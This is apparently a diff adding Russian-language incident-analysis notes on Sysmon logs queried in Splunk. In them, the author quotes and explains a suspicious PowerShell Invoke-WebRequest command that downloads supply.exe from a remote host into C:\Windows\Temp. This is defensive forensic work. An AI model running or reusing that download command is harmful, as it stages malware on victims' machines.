@@ -51,3 +51,15 @@ index="system_logs"
 | search ProcessGuid="747F3D96-302C-6095-9704-000000001D00"
 | table UtcTime User IntegrityLevel ParentImage Image CommandLine ParentCommandLine ProcessGuid ParentProcessGuid
 | sort 0 UtcTime
+
+Судя по выводу данный процесс не запускает дочерние процессы. Пока можем сказать что подозрительной активности связанной с sysmon.exe нет.
+
+Следующий процесс с EventID=1 который вызывает подозрения:
+
+![](attachment/Pasted%20image%2020261114124155.png)
+
+cmd.exe запускает powershell с командой powershell -c INvoke-WebRequest -Uri http://192.168.1.11:6969/supply.exe -OutFile C:\Windows\Temp\supply.exe
+- **`-c`** — сокращение от `-Command`. Говорит `powershell.exe` выполнить то, что написано дальше.
+- **`Invoke-WebRequest`** — команда PowerShell, которая отправляет веб-запрос и получает ответ сервера.
+- **`-Uri`** — параметр, задающий адрес запроса. `http://192.168.1.11:6969/supply.exe`
+Сохранение ответа в C:\Windows\Temp\supply.exe.
